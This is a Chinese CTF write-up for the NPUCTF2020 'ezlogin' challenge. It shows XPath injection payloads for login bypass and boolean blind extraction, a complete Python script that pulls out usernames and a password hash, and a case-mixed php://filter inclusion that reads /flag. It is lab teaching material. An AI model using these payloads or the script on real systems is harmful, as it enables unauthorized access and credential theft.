---
title: '[NPUCTF2020]ezlogin'
date: 2024-09-22 14:59:57
tags: xpath注入
categories: 刷题笔记
---

## [NPUCTF2020]ezlogin

我们写入用户名和密码进行抓包

![image-20240922150632129](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409221506289.png)

我们发现题目提交的数据跟往常的不一样，而且是用的xml类型，通过查询资料，这题要用xpath注入

[XPATH注入讲解](https://xz.aliyun.com/t/7791#toc-6)

在xpath中的查询语句为：

```
"/root/users/user[username/text()='".$name."' and password/text()='".$pwd."']";
```

其中\$name和\$pwd是我们输入的字符，这里对字符没有经过任何的过滤。

<!--more-->

当$name= admin‘ or 1=1 or ''='

拼接后的语句为：

```
"/root/users/user[username/text()='admin' or 1=1 or ''='' and password/text()='".$pwd."']";   //成为永真式，万能密码
```

 值得注意的是在xpath的查询语句中没有注释。

我们把文章给出的payload放上去

```
'or count(/)=1  or ''=' 
```

![image-20240922153805147](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409221538241.png)

```
'or count(/)=2  or ''=' 
```

![image-20240922153830714](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409221538774.png)

有明显的的布尔回显(注意在重新提交的时候记得刷新下页面)

说明他根下只有一个节点

接下来是盲注了，注意他那里有个token，过期时间比较快，记得用会话保持状态带上。

测试长度

payload

```
'or string-length(name(/*[1]))=4 or ''='
```

长度为4

猜测根节点下的名称

```
'or substring(name(/*[1]), 1, 1)='a'  or ''='
```

名称为root

猜测子节点的名称

```
'or substring(name(/root/*[1]), 1, 1)='a'  or ''='
```

名称为accounts

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/abcf4ed2b7b7f09f27ac086e2c0883ca.png)

account下还有两个节点

```
'or substring(name(/root/accounts/*[1]), 1, 1)='a'  or ''='

```

两个节点都为:`user`,

再跑user下的节点

发现第一个节点为id

![image-20240922154721721](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409221547798.png)

再跑跑后面的节点看看

username ，password

接着跑用户名和密码

```
'or substring(/root/accounts/user/username[1]/text(), 1, 1)='a'  or ''='

```

用户名

guest，adm1n

还有MD5加密后的密码cf7414b5bdb2e65ee43083f4ddbc4d9f

解码得到gtfly123

放上完整的exp

```
import requests
import re

s = requests.session()
url ='http://4ab0514f-3518-44ad-9b5f-f8c60fb0ea92.node3.buuoj.cn/login.php'



head ={
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",
    "Content-Type": "application/xml"
}
find =re.compile('<input type="hidden" id="token" value="(.*?)" />')

strs ='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'


flag =''
for i in range(1,100):
    for j in strs:

        r = s.post(url=url)
        token = find.findall(r.text)
        #猜测根节点名称
        payload_1 = "<username>'or substring(name(/*[1]), {}, 1)='{}'  or ''='</username><password>3123</password><token>{}</token>".format(i,j,token[0])
        #猜测子节点名称
        payload_2 = "<username>'or substring(name(/root/*[1]), {}, 1)='{}'  or ''='</username><password>3123</password><token>{}</token>".format(i,j,token[0])

        #猜测accounts的节点
        payload_3 ="<username>'or substring(name(/root/accounts/*[1]), {}, 1)='{}'  or ''='</username><password>3123</password><token>{}</token>".format(i,j,token[0])

        #猜测user节点
        payload_4 ="<username>'or substring(name(/root/accounts/user/*[2]), {}, 1)='{}'  or ''='</username><password>3123</password><token>{}</token>".format(i,j,token[0])

        #跑用户名和密码
        payload_username ="<username>'or substring(/root/accounts/user[2]/username/text(), {}, 1)='{}'  or ''='</username><password>3123</password><token>{}</token>".format(i,j,token[0])

        payload_password ="<username>'or substring(/root/accounts/user[2]/password/text(), {}, 1)='{}'  or ''='</username><password>3123</password><token>{}</token>".format(i,j,token[0])


        print(payload_username)
        r = s.post(url=url,headers=head,data=payload_username)
        print(r.text)


        if "非法操作" in r.text:
            flag+=j
            print(flag)
            break

    if "用户名或密码错误!" in r.text:
        break

print(flag)


```

我们用adm1n ，gtfly123进行登录

进入了一个新页面

我们打开源码，发现有个base64加密

![image-20240922161339130](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409221613229.png)

解码后得到

![image-20240922161438060](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409221614133.png)

我们知道了flag在/flag下

我们观察url发现传的参数是file，这让我们想到伪协议

```
?file=php://filter/convert-base64.encode/resource=/flag
```

![image-20240922162202376](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409221622411.png)

提示nonono，说明有过滤

接着就是大小绕过

```
?file=Php://filter/convert.bAse64-encode/resource=/flag
```

得到flag的base64加密，解码得到flag
